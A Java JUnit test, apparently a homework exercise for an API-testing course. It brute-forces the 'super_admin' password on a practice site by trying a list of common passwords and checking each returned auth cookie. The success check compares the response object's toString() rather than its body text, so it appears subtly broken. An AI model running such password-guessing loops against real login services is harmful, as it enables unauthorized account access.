import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class TestAuth {

    String[] passwords = new String[]{"password", "123456789", "12345678", "abc123", "football", "monkey",
            "letmein", "dragon", "trustno1", "adobe123", "welcome", "qwerty123", "solo", "master", "photoshop",
            "ashley", "bailey", "shadow", "7777777", "michael", "jesus", "696969", "qazwsx", "batman", "Football",
            "123456", "qwerty", "12345", "1234567890", "1234567", "111111", "1234", "baseball", "princess", "121212",
            "login", "flower", "1q2w3e4r", "666666", "1qaz2wsx", "mustang", "access", "passw0rd", "loveme", "!@#$%^&*",
            "superman", "hottie", "ninja", "zaq1zaq1", "123qwe", "qwertyuiop", "654321", "555555", "lovely", "888888", "donald",
            "aa123456", "charlie", "123123", "iloveyou", "sunshine", "admin", "starwars", "hello", "password1", "freedom", "azerty",
            "whatever", "000000"};

    @Test

    public void findPassword () {
        int i = 0;
        String password;

        do {
            password = passwords[i];
            System.out.println(password);

            Map<String, Object> enterData = new HashMap<>();
            enterData.put("login", "super_admin");
            enterData.put("password", password);
            Response response1 = RestAssured
                    .given()
                    .body(enterData)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String cookieValue = response1.getCookie("auth_cookie");

            Map<String, Object> key = new HashMap<>();
            key.put("auth_cookie", cookieValue);
            Response response2 = RestAssured
                    .given()
                    .body(enterData)
                    .cookies(key)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();


            if (Objects.equals(response2.getBody().toString(), "You are authorized")){
                response2.prettyPrint();
                System.out.println("your password is: " + password);
            }

            i++;

        } while (i < passwords.length);



    }

}

